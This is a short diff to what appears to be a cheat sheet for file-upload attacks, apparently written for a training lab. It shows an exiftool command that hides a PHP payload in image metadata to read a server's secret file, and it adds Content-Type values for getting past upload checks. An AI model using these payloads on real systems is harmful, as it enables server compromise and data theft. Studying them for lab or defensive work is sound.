@@ -43,3 +43,7 @@ file.pHp5....
 5) Create a polyglot PHP/JPG file that is a normal image, but contains your PHP payload in its metadata
 
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" exploit.jpg -o polyglot.php
+
+
+6) Bypass Content-Type checks by setting the value of the Content-Type header to: image/png , text/plain , application/octet-stream
+         
